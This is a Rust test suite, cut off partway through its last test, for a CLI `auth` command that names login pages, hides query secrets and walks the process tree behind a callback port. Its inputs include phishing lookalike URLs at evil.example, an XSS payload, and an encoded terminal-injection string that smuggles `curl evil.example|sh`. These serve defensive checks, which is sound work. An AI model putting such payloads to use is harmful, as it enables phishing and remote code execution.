//! `conbus auth`: the vendor table with stand-ins, `--url` naming a page
//! without ever echoing its query values, and `--html` writing one
//! self-contained page that reaches no network.

use std::process::Command;
mod support;

const NOT_THERE: &str = "/nonexistent/conbus-test-vendor";

fn conbus(root: &std::path::Path) -> Command {
    let mut command = Command::new(env!("CARGO_BIN_EXE_conbus"));
    command
        .env("CONBUS_HOME", root)
        .env("HOME", root)
        .env("CONBUS_SKIP_LAUNCHCTL", "1")
        .env("CONBUS_AGY_BIN", NOT_THERE)
        .env("CONBUS_CODEX_BIN", NOT_THERE)
        .env("CONBUS_GH", NOT_THERE);
    command
}

/// An `agy models` that reports no login; `-p` writes a marker to `calls`
/// the way the real one would reach OAuth — it must never run.
fn fake_logged_out_agy() -> (tempfile::TempDir, std::path::PathBuf, std::path::PathBuf) {
    let dir = tempfile::tempdir().expect("tempdir");
    let calls = dir.path().join("calls");
    let script = format!(
        "#!/bin/sh\nprintf '%s\\n' \"$1\" >>\"{}\"\n\
         if [ \"$1\" = models ]; then\n  echo 'sign in required' >&2\n  exit 1\nfi\n",
        calls.display()
    );
    let path = dir.path().join("agy");
    support::write_executable(&path, &script);
    (dir, path, calls)
}

/// A `gh` that answers `auth status` like a signed-in one.
fn fake_gh(exit_code: i32) -> (tempfile::TempDir, std::path::PathBuf) {
    let dir = tempfile::tempdir().expect("tempdir");
    let path = dir.path().join("gh");
    support::write_executable(
        &path,
        &format!(
            "#!/bin/sh\nif [ \"$1 $2\" = 'auth status' ]; then exit {exit_code}; fi\nexit 1\n"
        ),
    );
    (dir, path)
}

#[test]
fn auth_table_names_what_needs_a_login_and_exit_stays_zero() {
    let (_agy_dir, agy, calls) = fake_logged_out_agy();
    let (_gh_dir, gh) = fake_gh(0);
    let root = tempfile::tempdir().expect("tempdir");
    let output = conbus(root.path())
        .arg("auth")
        .env("CONBUS_AGY_BIN", &agy)
        .env("CONBUS_GH", &gh)
        .output()
        .expect("run auth");
    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(
        output.status.success(),
        "a vendor without login must not fail the command: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        stdout.contains("needs no login of its own"),
        "the conbus line: {stdout}"
    );
    assert!(stdout.contains("AUTH_REQUIRED"), "agy's line: {stdout}");
    assert!(
        stdout.contains("gh") && stdout.contains("signed in"),
        "gh's line: {stdout}"
    );
    // `auth` may check the login question but never `-p`, which is what
    // opened the browser tabs that made this command necessary.
    let called = std::fs::read_to_string(&calls).unwrap_or_default();
    assert!(
        !called.lines().any(|line| line == "-p"),
        "auth must never run `agy -p`: {called}"
    );
}

/// The one line of the table for `name`.
fn row<'a>(table: &'a str, name: &str) -> &'a str {
    table
        .lines()
        .find(|line| line.split_whitespace().next() == Some(name))
        .unwrap_or_else(|| panic!("no {name} row: {table}"))
}

fn the_table() -> String {
    let root = tempfile::tempdir().expect("tempdir");
    let output = conbus(root.path()).arg("auth").output().expect("run auth");
    assert!(output.status.success());
    String::from_utf8_lossy(&output.stdout).into_owned()
}

#[test]
fn the_background_row_names_what_runs_with_nobody_at_the_keyboard() {
    // "Nothing conbus runs on its own asks a vendor to sign in" had no support:
    // gap fill and a hop start vendor programs, and a hop opens vendor apps.
    let table = the_table();

    assert!(!table.contains("nothing conbus runs on its own"), "{table}");
    let background = row(&table, "background");
    for word in [
        "`codex app-server`",
        "gap fill",
        "`thread/start`",
        "`claude -p`",
        "`gh`",
        "`open -b`",
        "`cursor -n`",
        "`osascript`",
    ] {
        assert!(background.contains(word), "{word} in {background}");
    }
    let measured = row(&table, "measured");
    for word in [
        "Codex 0.166",
        "`thread/list`",
        "`thread/start`",
        "unmeasured",
    ] {
        assert!(measured.contains(word), "{word} in {measured}");
    }
}

#[test]
fn a_vendor_a_hop_can_open_is_not_called_unused() {
    let table = the_table();

    assert!(!table.contains("not used"), "{table}");
    for (name, opener) in [
        ("cursor", "`cursor -n`"),
        ("grok", "`osascript`"),
        ("opencode", "`osascript`"),
    ] {
        let line = row(&table, name);
        assert!(line.contains("not checked"), "{line}");
        assert!(
            line.contains("hop") && line.contains(opener) && line.contains("`conbus run`"),
            "{line}"
        );
    }
    assert!(row(&table, "opencode").contains("`opencode --version`"));
    let claude = row(&table, "claude");
    for word in ["`claude -p`", "`summary`", "`conbus run`"] {
        assert!(claude.contains(word), "{word} in {claude}");
    }
}

#[test]
fn the_agy_row_names_everything_that_runs_agy() {
    let table = the_table();

    let agy = row(&table, "agy");
    for word in ["`conbus quota`", "`conbus auth`", "hop", "`conbus run`"] {
        assert!(agy.contains(word), "{word} in {agy}");
    }
}

#[test]
fn auth_url_names_the_page_without_echoing_its_query() {
    let root = tempfile::tempdir().expect("tempdir");
    let url = "https://accounts.google.com/o/oauth2/v2/auth?client_id=SECRETID&scope=EMAILSCOPE&redirect_uri=http%3A%2F%2F127.0.0.1%3A59999%2Fcb";
    let output = conbus(root.path())
        .args(["auth", "--url", url])
        .output()
        .expect("run auth --url");
    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());
    assert!(stdout.contains("Google sign-in"), "the page: {stdout}");
    for secret in ["SECRETID", "EMAILSCOPE"] {
        assert!(
            !stdout.contains(secret),
            "query values must never print: {secret} in {stdout}"
        );
    }
    assert!(stdout.contains("conbus"), "the conbus verdict: {stdout}");
}

/// `this` as `conbus auth --url` answers it: the label alone.
fn page_label(root: &std::path::Path, url: &str) -> String {
    let output = conbus(root)
        .args(["auth", "--url", url])
        .output()
        .expect("run auth --url");
    assert!(
        output.status.success(),
        "{url}: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
    stdout
        .lines()
        .next()
        .and_then(|line| line.strip_prefix("this"))
        .unwrap_or_else(|| panic!("{url}: no `this` line in {stdout}"))
        .trim()
        .to_string()
}

/// Addresses that name a vendor anywhere but in their scheme and host. Each
/// one is a page the vendor does not serve.
const NOT_THE_VENDOR: &[&str] = &[
    "https://evil.example/phish?next=auth.openai.com",
    "https://auth.openai.com.evil.example/authorize",
    "https://evil.example/claude.ai/login",
    "https://notcursor.com/login",
    "https://netflix.ai/",
    "https://evil.example/?a=github.com/login",
    "https://evil.example/?x=chrome-extension://mmlmfjhmonkocbjadbfplnigmagldckm/",
    "https://accounts.google.com.evil.example/o/oauth2/auth",
    "https://auth.openai.com@evil.example/",
    "https://auth.openai.com:443@evil.example/",
    "https://evil.example#auth.openai.com",
    "https://evil.example\\@auth.openai.com/",
    "https://auth.openai.com%2f.evil.example/",
    "https://evilx.ai/",
    "https://x.ai.evil.example/",
    "https://.x.ai/",
    "http://auth.openai.com/",
    "ftp://github.com/",
    "chrome-extension://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/connect.html",
    "chrome-extension://auth.openai.com/",
    "https://mmlmfjhmonkocbjadbfplnigmagldckm/connect.html",
    "auth.openai.com/authorize",
    "not an address at all",
    "",
];

/// Addresses the vendors do serve, and the word each label must carry.
const THE_VENDOR: &[(&str, &str)] = &[
    (
        "chrome-extension://mmlmfjhmonkocbjadbfplnigmagldckm/connect.html",
        "Playwright MCP Bridge",
    ),
    (
        "https://accounts.google.com/o/oauth2/v2/auth?client_id=x",
        "Google",
    ),
    ("https://auth.openai.com/authorize", "OpenAI"),
    ("HTTPS://AUTH.OPENAI.COM/", "OpenAI"),
    ("https://claude.ai/login", "claude.ai"),
    ("https://console.anthropic.com/", "Anthropic Console"),
    ("https://cursor.com/loginDeepControl", "cursor.com"),
    ("https://www.cursor.com/", "cursor.com"),
    ("https://accounts.x.ai/sign-in", "x.ai"),
    ("https://x.ai/", "x.ai"),
    ("https://github.com/login/device", "github.com"),
    // The query names another vendor. The host is what counts.
    (
        "https://github.com/login/oauth/authorize?redirect_uri=https%3A%2F%2Fcursor.com%2Fcb",
        "github.com",
    ),
];

#[test]
fn a_page_is_named_by_its_scheme_and_host_and_nothing_else() {
    let root = tempfile::tempdir().expect("tempdir");
    for url in NOT_THE_VENDOR {
        assert_eq!(
            page_label(root.path(), url),
            "unknown page",
            "{url} is not the vendor's"
        );
    }
    for (url, word) in THE_VENDOR {
        let label = page_label(root.path(), url);
        assert!(label.contains(word), "{url} read as {label}");
    }
}

#[test]
fn a_broken_percent_sign_is_not_a_crash() {
    // The decoder used to slice a `str` at a byte offset, so a multibyte
    // character straight after `%` panicked with exit 101.
    let root = tempfile::tempdir().expect("tempdir");
    for url in [
        "https://x.example/?a=%a\u{e9}",
        "https://x.example/?token=SECRET-TOKEN-VALUE%a\u{e9}",
        "https://x.example/?client=SECRET-CLIENT%a\u{e9}",
        "https://x.example/?redirect_uri=%E0%A4%A",
        "https://x.example/?%a\u{e9}=1",
    ] {
        let output = conbus(root.path())
            .args(["auth", "--url", url])
            .output()
            .expect("run auth --url");
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert_eq!(output.status.code(), Some(0), "{url}: {stderr}");
        assert!(stdout.contains("unknown page"), "{url}: {stdout}");
        assert!(
            !stdout.contains("SECRET") && !stderr.contains("SECRET"),
            "{url} echoed a query value: {stdout} {stderr}"
        );
    }
}

/// node, or a failure that says why: a missing interpreter must not read as a
/// page script that behaves.
fn node() -> &'static str {
    match Command::new("node").arg("--version").output() {
        Ok(out) if out.status.success() => "node",
        Ok(out) => panic!("`node --version` exited {}", out.status),
        Err(err) => panic!(
            "node is not on PATH ({err}). These tests run the --html page's script in node \
             rather than skipping it"
        ),
    }
}

/// Run the page's own script against `urls`, as a browser would on a paste, and
/// return what it wrote for each. A script that throws fails the run.
fn page_script_says(page: &std::path::Path, urls: &[&str]) -> Vec<String> {
    const DRIVER: &str = r#"
const fs = require("fs");
const html = fs.readFileSync(process.argv[1], "utf8");
const script = html.match(/<script>([\s\S]*?)<\/script>/)[1];
const verdict = { textContent: "" };
const input = { value: "" };
globalThis.document = { getElementById: (id) => (id === "url" ? input : verdict) };
(0, eval)(script);
const said = JSON.parse(process.argv[2]).map((url) => {
  input.value = url;
  verdict.textContent = "(unset)";
  look();
  return verdict.textContent;
});
console.log(JSON.stringify(said));
"#;
    let urls_json = serde_json::to_string(urls).expect("json");
    let output = Command::new(node())
        .args(["-e", DRIVER])
        .arg(page)
        .arg(urls_json)
        .output()
        .expect("run node");
    assert!(
        output.status.success(),
        "the page's script threw: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    serde_json::from_slice(&output.stdout).expect("what the script wrote")
}

/// A page written with every vendor a stand-in, for the tests that only care
/// about its script.
fn a_page() -> (tempfile::TempDir, std::path::PathBuf) {
    let root = tempfile::tempdir().expect("tempdir");
    let page = root.path().join("auth.html");
    let output = conbus(root.path())
        .args(["auth", "--html", page.to_str().expect("utf8")])
        .output()
        .expect("run auth --html");
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    (root, page)
}

#[test]
fn the_pages_script_names_pages_the_way_the_command_does() {
    let (_root, page) = a_page();

    for (url, said) in NOT_THE_VENDOR
        .iter()
        .zip(page_script_says(&page, NOT_THE_VENDOR))
    {
        assert!(
            said.starts_with("this      unknown page"),
            "{url} is not the vendor's: {said}"
        );
    }
    let vendor_urls: Vec<&str> = THE_VENDOR.iter().map(|(url, _)| *url).collect();
    for ((url, word), said) in THE_VENDOR.iter().zip(page_script_says(&page, &vendor_urls)) {
        let first = said.lines().next().unwrap_or_default();
        assert!(first.contains(word), "{url} read as {first}");
    }
}

#[test]
fn the_pages_script_looks_up_only_a_port_on_this_machine() {
    let (_root, page) = a_page();
    let page_says = |url: &str| page_script_says(&page, &[url]).remove(0);

    for (value, port) in [
        ("http%3A%2F%2F127.0.0.1%3A59999%2Fcb", 59999),
        ("http%3A%2F%2Flocalhost%3A59999%2Fcb", 59999),
        ("http%3A%2F%2F%5B%3A%3A1%5D%3A59999%2Fcb", 59999),
        ("localhost%3A59999%2Fcb", 59999),
        ("http%3A%2F%2Fuser%3A1234%40127.0.0.1%3A9%2Fcb", 9),
    ] {
        let said = page_says(&format!(
            "https://accounts.google.com/o/oauth2/auth?redirect_uri={value}&token=SECRET3"
        ));
        assert!(said.contains(&format!("-iTCP:{port} ")), "{value}: {said}");
        assert!(!said.contains("SECRET3"), "{said}");
    }

    for value in [
        "https%3A%2F%2Fother.example%3A1%2Fcb",
        "http%3A%2F%2F127.0.0.1.other.example%3A1%2F",
        "http%3A%2F%2F10.0.0.1%3A1%2F",
    ] {
        let said = page_says(&format!("https://evil.example/?redirect_uri={value}"));
        assert!(!said.contains("lsof"), "{value}: {said}");
        assert!(said.contains("another host"), "{value}: {said}");
        assert!(!said.contains("other.example"), "{said}");
    }

    let said = page_says("https://example.net/?q=<img src=x onerror=alert(1)>&token=SECRET1");
    assert!(
        !said.contains("onerror") && !said.contains("SECRET1"),
        "{said}"
    );

    // The page cannot see processes, so it gives no verdict of its own.
    let said = page_says("https://accounts.google.com/");
    assert!(!said.contains("conbus opens none"), "{said}");
    assert!(said.contains("conbus auth --url -"), "{said}");
}

#[test]
fn a_bad_percent_in_the_pages_script_does_not_lose_the_verdict() {
    let (_root, page) = a_page();

    let said = page_script_says(
        &page,
        &["https://accounts.google.com/o/oauth2/auth?redirect_uri=%E0%A4%A&token=SECRET2"],
    );

    assert!(said[0].contains("Google"), "the verdict: {}", said[0]);
    assert!(!said[0].contains("SECRET2"), "{}", said[0]);
}

/// Stand-ins for `lsof` and `ps` that answer from a table, so a verdict can be
/// pinned without the machine's real processes. `lsof` also keeps its calls.
struct ProcessTable {
    dir: tempfile::TempDir,
    lsof_calls: std::path::PathBuf,
}

impl ProcessTable {
    /// `listeners` hold every port asked about. `processes` is pid, ppid, name;
    /// a pid not in it is one `ps` no longer finds.
    fn new(listeners: &[u32], processes: &[(u32, u32, &str)]) -> Self {
        let dir = tempfile::tempdir().expect("tempdir");
        let lsof_calls = dir.path().join("lsof.calls");
        let pids: String = listeners.iter().map(|pid| format!("{pid}\n")).collect();
        let found = if listeners.is_empty() { 1 } else { 0 };
        support::write_executable(
            &dir.path().join("lsof"),
            &format!(
                "#!/bin/sh\nprintf '%s\\n' \"$*\" >>'{}'\nprintf '%s' '{pids}'\nexit {found}\n",
                lsof_calls.display()
            ),
        );
        let arms: String = processes
            .iter()
            .map(|(pid, ppid, name)| format!("  {pid}) echo '{ppid} {name}' ;;\n"))
            .collect();
        support::write_executable(
            &dir.path().join("ps"),
            &format!(
                "#!/bin/sh\nwhile [ $# -gt 1 ]; do shift; done\ncase $1 in\n{arms}  *) exit 1 ;;\nesac\n"
            ),
        );
        ProcessTable { dir, lsof_calls }
    }

    /// `conbus auth --url` with these stand-ins first on PATH.
    fn ask(&self, url: &str) -> String {
        let root = tempfile::tempdir().expect("tempdir");
        let path = format!(
            "{}:{}",
            self.dir.path().display(),
            std::env::var("PATH").unwrap_or_default()
        );
        let output = conbus(root.path())
            .args(["auth", "--url", url])
            .env("PATH", path)
            .output()
            .expect("run auth --url");
        assert!(
            output.status.success(),
            "{url}: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        String::from_utf8_lossy(&output.stdout).into_owned()
    }

    fn lsof_calls(&self) -> String {
        std::fs::read_to_string(&self.lsof_calls).unwrap_or_default()
    }
}

/// The address the bridge opens: a relay on a loopback port.
fn bridge_url(port: u16) -> String {
    format!(
        "chrome-extension://mmlmfjhmonkocbjadbfplnigmagldckm/connect.html?mcpRelayUrl=ws%3A%2F%2F127.0.0.1%3A{port}%2F"
    )
}

/// What a walked-up listener under Codex.app looks like.
const CODEX_TREE: &[(u32, u32, &str)] = &[
    (4242, 4000, "/opt/node/bin/node"),
    (4000, 3000, "codex"),
    (3000, 1, "/Applications/Codex.app/Contents/MacOS/Codex"),
    (1, 0, "/sbin/launchd"),
];

fn verdict(stdout: &str) -> &str {
    let lines: Vec<&str> = stdout
        .lines()
        .filter(|l| l.starts_with("conbus "))
        .collect();
    assert_eq!(lines.len(), 1, "one verdict line: {stdout}");
    lines[0]
}

#[test]
fn no_takes_a_listener_walked_all_the_way_to_the_root() {
    let table = ProcessTable::new(&[4242], CODEX_TREE);

    let stdout = table.ask(&bridge_url(55407));

    assert!(verdict(&stdout).starts_with("conbus    no:"), "{stdout}");
    assert!(
        stdout.contains("process   port 55407: pid 4242: node > codex > Codex > launchd"),
        "the walk it rests on, names only: {stdout}"
    );
    assert!(table.lsof_calls().contains("-iTCP:55407"), "{stdout}");
}

#[test]
fn no_says_what_a_walk_cannot_see() {
    // A process that outlived what started it hangs from the root, and so does
    // an app `open` started: neither shows who asked. And every conbus read
    // starts `codex app-server`, so "starts no server" was false as written.
    let table = ProcessTable::new(&[4242], CODEX_TREE);

    let stdout = table.ask(&bridge_url(55407));

    assert!(!stdout.contains("starts no server"), "{stdout}");
    let limit = stdout
        .lines()
        .find(|line| line.starts_with("limit "))
        .unwrap_or_else(|| panic!("no limit line: {stdout}"));
    for word in ["outlived", "`open`", "`osascript`", "`codex app-server`"] {
        assert!(limit.contains(word), "{word} in {limit}");
    }
    let measured = stdout
        .lines()
        .find(|line| line.starts_with("measured "))
        .unwrap_or_else(|| panic!("no measured line: {stdout}"));
    for word in [
        "Codex 0.166",
        "`thread/list`",
        "`thread/start`",
        "unmeasured",
    ] {
        assert!(measured.contains(word), "{word} in {measured}");
    }
}

#[test]
fn conbus_far_above_the_listener_is_still_yes() {
    // The walk used to stop at eight levels, without a word, and say `no`.
    let names: Vec<String> = (0..11).map(|level| format!("level{level}")).collect();
    let mut tree: Vec<(u32, u32, &str)> = names
        .iter()
        .enumerate()
        .map(|(level, name)| (100 + level as u32, 101 + level as u32, name.as_str()))
        .collect();
    tree.push((111, 112, "/somewhere/bin/conbus"));
    tree.push((112, 1, "launcher"));
    tree.push((1, 0, "/sbin/launchd"));
    let table = ProcessTable::new(&[100], &tree);

    let stdout = table.ask(&bridge_url(55407));

    assert!(verdict(&stdout).starts_with("conbus    yes:"), "{stdout}");
    assert!(
        stdout.contains("level10 > conbus > launcher > launchd"),
        "{stdout}"
    );
}

#[test]
fn every_listener_on_the_port_is_walked() {
    // Two listeners on one port, the conbus one second: only the first used to
    // be walked, and the answer was `no`.
    let table = ProcessTable::new(
        &[4242, 777],
        &[
            (4242, 1, "/opt/node/bin/node"),
            (777, 776, "python3"),
            (776, 1, "conbus"),
            (1, 0, "/sbin/launchd"),
        ],
    );

    let stdout = table.ask(&bridge_url(55407));

    assert!(verdict(&stdout).starts_with("conbus    yes:"), "{stdout}");
    assert!(stdout.contains("pid 4242: node > launchd"), "{stdout}");
    assert!(
        stdout.contains("pid 777: python3 > conbus > launchd"),
        "{stdout}"
    );
}

#[test]
fn only_the_name_of_the_binary_makes_a_process_conbus() {
    for (name, yes) in [
        ("conbus", true),
        ("/home/someone/.local/bin/conbus", true),
        ("conbus.next", true),
        ("conbus-scratch", true),
        ("notconbus", false),
        ("conbusd", false),
        ("/home/someone/conbus/bin/node", false),
        ("/tmp/conbus-work/node", false),
    ] {
        let table = ProcessTable::new(&[50], &[(50, 1, name), (1, 0, "/sbin/launchd")]);
        let stdout = table.ask(&bridge_url(55407));
        let want = if yes {
            "conbus    yes:"
        } else {
            "conbus    no:"
        };
        assert!(verdict(&stdout).starts_with(want), "{name}: {stdout}");
    }
}

#[test]
fn a_callback_on_another_host_is_not_looked_up_here() {
    // The port of `another.example` was answered from this machine's process
    // table, whose listener on that number has nothing to do with it.
    let table = ProcessTable::new(&[4242], CODEX_TREE);

    for url in [
        "https://evil.example/login?redirect_uri=https%3A%2F%2Fanother.example%3A55407%2Fcb",
        "https://evil.example/?redirect_uri=http%3A%2F%2F127.0.0.1.another.example%3A55407%2F",
        "https://evil.example/?redirect_uri=http%3A%2F%2Flocalhost.another.example%3A55407%2F",
        "https://evil.example/?redirect_uri=http%3A%2F%2F10.0.0.1%3A55407%2F",
        "https://evil.example/?redirect_uri=http%3A%2F%2F0.0.0.0%3A55407%2F",
        "https://evil.example/?redirect_uri=http%3A%2F%2F%5B2001%3Adb8%3A%3A1%5D%3A55407%2F",
    ] {
        let stdout = table.ask(url);
        assert!(
            verdict(&stdout).starts_with("conbus    cannot tell:"),
            "{url}: {stdout}"
        );
        assert!(stdout.contains("another host"), "{url}: {stdout}");
        assert!(
            !stdout.contains("another.example") && !stdout.contains("10.0.0.1"),
            "a query value is not printed: {stdout}"
        );
    }
    assert_eq!(table.lsof_calls(), "", "no remote port goes to lsof");
}

#[test]
fn a_callback_on_this_machine_is_found_however_it_is_written() {
    for (value, port) in [
        ("http%3A%2F%2F127.0.0.1%3A55407%2Fcb", 55407),
        ("http%3A%2F%2F127.0.0.2%3A55407%2Fcb", 55407),
        ("http%3A%2F%2Flocalhost%3A55407%2Fcb", 55407),
        ("http%3A%2F%2FLOCALHOST%3A55407", 55407),
        ("ws%3A%2F%2F127.0.0.1%3A55407", 55407),
        ("http%3A%2F%2F%5B%3A%3A1%5D%3A55407%2Fcb", 55407),
        (
            "http%3A%2F%2F%5B%3A%3Affff%3A127.0.0.1%5D%3A55407%2Fcb",
            55407,
        ),
        ("localhost%3A55407%2Fcb", 55407),
        ("127.0.0.1%3A55407", 55407),
        // The number after the userinfo's colon is a password, not a port.
        ("http%3A%2F%2Fuser%3A1234%40127.0.0.1%3A9%2Fcb", 9),
    ] {
        let table = ProcessTable::new(&[4242], CODEX_TREE);
        let stdout = table.ask(&format!(
            "https://accounts.google.com/o/oauth2/auth?redirect_uri={value}"
        ));
        assert!(
            table.lsof_calls().contains(&format!("-iTCP:{port} ")),
            "{value} should ask about {port}: {}",
            table.lsof_calls()
        );
        assert!(
            verdict(&stdout).starts_with("conbus    no:"),
            "{value}: {stdout}"
        );
    }
}

#[test]
fn with_nothing_to_walk_it_cannot_tell_and_says_what_would() {
    let empty = ProcessTable::new(&[], &[]);

    // No listener on the port.
    let stdout = empty.ask(&bridge_url(55407));
    assert!(
        verdict(&stdout).starts_with("conbus    cannot tell:"),
        "{stdout}"
    );
    assert!(stdout.contains("still waits"), "what would tell: {stdout}");

    // No port in the URL at all, and a callback with none.
    for url in [
        "https://accounts.google.com/o/oauth2/auth?client_id=x",
        "https://accounts.google.com/o/oauth2/auth?redirect_uri=http%3A%2F%2F127.0.0.1%2Fcb",
        "https://accounts.google.com/o/oauth2/auth?callback=someFunction",
        "https://accounts.google.com/o/oauth2/auth?redirect_uri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob",
    ] {
        let stdout = empty.ask(url);
        assert!(
            verdict(&stdout).starts_with("conbus    cannot tell:"),
            "{url}: {stdout}"
        );
        assert!(stdout.contains("would tell"), "{url}: {stdout}");
    }
    assert_eq!(
        empty.lsof_calls().lines().count(),
        1,
        "only the first asked"
    );
}

#[test]
fn with_no_lsof_it_cannot_tell() {
    let root = tempfile::tempdir().expect("tempdir");
    let empty = tempfile::tempdir().expect("tempdir");

    let output = conbus(root.path())
        .args(["auth", "--url", &bridge_url(55407)])
        .env("PATH", empty.path())
        .output()
        .expect("run auth --url");
    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());
    assert!(
        verdict(&stdout).starts_with("conbus    cannot tell:"),
        "{stdout}"
    );
    assert!(stdout.contains("`lsof`"), "what would tell: {stdout}");
}

#[test]
fn a_walk_that_cannot_reach_the_root_is_not_a_no() {
    // A parent `ps` no longer finds, a process that is its own ancestor, and
    // two that are each other's.
    for tree in [
        &[(50, 40, "node")][..],
        &[(50, 50, "node")][..],
        &[(50, 40, "node"), (40, 50, "npm")][..],
    ] {
        let table = ProcessTable::new(&[50], tree);
        let stdout = table.ask(&bridge_url(55407));
        assert!(
            verdict(&stdout).starts_with("conbus    cannot tell:"),
            "{tree:?}: {stdout}"
        );
        assert!(stdout.contains("before the root"), "{tree:?}: {stdout}");
    }
}

#[test]
fn a_port_with_several_callbacks_needs_all_of_them_clear_for_no() {
    let table = ProcessTable::new(&[4242], CODEX_TREE);
    let local = "http%3A%2F%2F127.0.0.1%3A55407%2F";
    let remote = "https%3A%2F%2Fanother.example%3A1%2F";

    let stdout = table.ask(&format!(
        "https://x.example/?redirect_uri={local}&callback={remote}"
    ));

    assert!(
        verdict(&stdout).starts_with("conbus    cannot tell:"),
        "{stdout}"
    );
}

/// The real `lsof` and `ps`, for what stand-ins cannot pin: the arguments.
fn have_lsof_and_ps() -> bool {
    ["lsof", "ps"].iter().all(|name| {
        Command::new("sh")
            .args(["-c", &format!("command -v {name}")])
            .output()
            .is_ok_and(|output| output.status.success())
    })
}

/// A stand-in `codex app-server` that listens on a port of its own and stays
/// quiet until told to stop, so a conbus read is still waiting on it.
const LISTENING_CODEX: &str = r#"#!/usr/bin/env python3
import os, socket, sys, time
here = os.path.dirname(os.path.abspath(__file__))
s = socket.socket()
s.bind(("127.0.0.1", 0))
s.listen(1)
with open(os.path.join(here, "port.tmp"), "w") as f:
    f.write(str(s.getsockname()[1]))
os.rename(os.path.join(here, "port.tmp"), os.path.join(here, "port"))
deadline = time.time() + 30
while time.time() < deadline and not os.path.exists(os.path.join(here, "stop")):
    time.sleep(0.05)
"#;

#[test]
fn a_real_listener_under_a_real_conbus_is_yes() {
    if !have_lsof_and_ps() {
        return;
    }
    let root = tempfile::tempdir().expect("tempdir");
    let codex_dir = tempfile::tempdir().expect("tempdir");
    let codex = codex_dir.path().join("codex");
    support::write_executable(&codex, LISTENING_CODEX);
    let port_file = codex_dir.path().join("port");
    let mut quota = conbus(root.path())
        .arg("quota")
        .env("CONBUS_CODEX_BIN", &codex)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .expect("run quota");
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
    let port = loop {
        if let Ok(text) = std::fs::read_to_string(&port_file) {
            break text.trim().parse::<u16>().expect("port");
        }
        assert!(
            std::time::Instant::now() < deadline,
            "the stand-in never listened"
        );
        std::thread::sleep(std::time::Duration::from_millis(20));
    };

    let output = conbus(root.path())
        .args(["auth", "--url", &bridge_url(port)])
        .output()
        .expect("run auth --url");
    std::fs::write(codex_dir.path().join("stop"), "").expect("stop");
    quota.wait().expect("quota ends with its server");

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(verdict(&stdout).starts_with("conbus    yes:"), "{stdout}");
    assert!(stdout.contains(" > conbus > "), "{stdout}");
}

#[test]
fn a_real_listener_is_walked_to_the_root() {
    if !have_lsof_and_ps() {
        return;
    }
    let root = tempfile::tempdir().expect("tempdir");
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
    let port = listener.local_addr().expect("addr").port();

    let output = conbus(root.path())
        .args(["auth", "--url", &bridge_url(port)])
        .output()
        .expect("run auth --url");
    let stdout = String::from_utf8_lossy(&output.stdout);

    // This test's own process holds the port, so the line starts with it, and
    // the walk ends at the root. `yes` is right too when the suite itself runs
    // under `conbus run`; `cannot tell` is not.
    let me = std::env::current_exe().expect("exe");
    let me = me.file_name().expect("name").to_string_lossy();
    let shown: String = me.chars().take(15).collect();
    let process = stdout
        .lines()
        .find(|line| line.starts_with("process "))
        .unwrap_or_else(|| panic!("{stdout}"));
    assert!(process.contains(&format!(": {shown}")), "{stdout}");
    assert!(!verdict(&stdout).contains("cannot tell"), "{stdout}");
}

/// A bridge address whose `client` parameter is `json`, every byte encoded.
fn url_with_client(json: &str) -> String {
    let encoded: String = json.bytes().map(|byte| format!("%{byte:02X}")).collect();
    format!("https://x.example/?client={encoded}")
}

fn ask(url: &str) -> String {
    let root = tempfile::tempdir().expect("tempdir");
    let output = conbus(root.path())
        .args(["auth", "--url", url])
        .output()
        .expect("run auth --url");
    assert!(
        output.status.success(),
        "{url}: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    String::from_utf8_lossy(&output.stdout).into_owned()
}

#[test]
fn a_client_name_cannot_forge_a_line_or_reach_the_terminal() {
    let stdout = ask(
        "https://x.example/?client=%7B%22name%22%3A%22ok%5Cu001b%5B2K%5Cnconbus%20%20%20%20no%3A%20verified%20safe%5Cnfix%20%20%20%20%20%20%20curl%20evil.example%7Csh%22%7D",
    );

    assert!(
        !stdout.contains('\u{1b}'),
        "an escape reached stdout: {stdout:?}"
    );
    assert!(!stdout.contains("verified safe"), "{stdout}");
    assert!(!stdout.contains("evil.example"), "{stdout}");
    assert!(!stdout.lines().any(|l| l.starts_with("fix ")), "{stdout}");
    assert!(
        verdict(&stdout).starts_with("conbus    cannot tell:"),
        "{stdout}"
    );
}

#[test]
fn only_a_printable_name_of_a_sensible_length_is_printed() {
    let long = "x".repeat(65);
    for name in [
        "a\nb",
        "a\rb",
        "a\tb",
        "a\u{7}b",
        "a\u{7f}b",
        "a\u{9b}31mb",
        "a\u{202e}b",
        "a\u{200b}b",
        long.as_str(),
    ] {
        let json = serde_json::json!({ "name": name }).to_string();
        let stdout = ask(&url_with_client(&json));
        let says = row(&stdout, "url");
        assert!(says.contains("will not print"), "{name:?}: {stdout}");
        assert_eq!(
            stdout.lines().filter(|l| l.starts_with("url says")).count(),
            1
        );
        assert!(!says.contains(name), "{name:?}: {stdout}");
    }

    let longest = "x".repeat(64);
    for name in [
        "codex-mcp-client",
        "a b_c.d",
        "\u{d55c}\u{ae00}",
        longest.as_str(),
    ] {
        let json = serde_json::json!({ "name": name }).to_string();
        let stdout = ask(&url_with_client(&json));
        assert!(
            row(&stdout, "url").contains(&format!("\"{name}\"")),
            "{name:?}: {stdout}"
        );
    }
}

#[test]
fn a_client_name_is_printed_as_the_urls_claim_and_alone() {
    let stdout = ask(&url_with_client(
        r#"{"name":"test-client","version":"SECRETVERSION","key":"SECRETKEY"}"#,
    ));

    let says = row(&stdout, "url");
    assert!(says.contains("\"test-client\""), "{stdout}");
    assert!(says.contains("claim"), "not stated as a fact: {stdout}");
    assert!(!stdout.contains("asked by  "), "{stdout}");
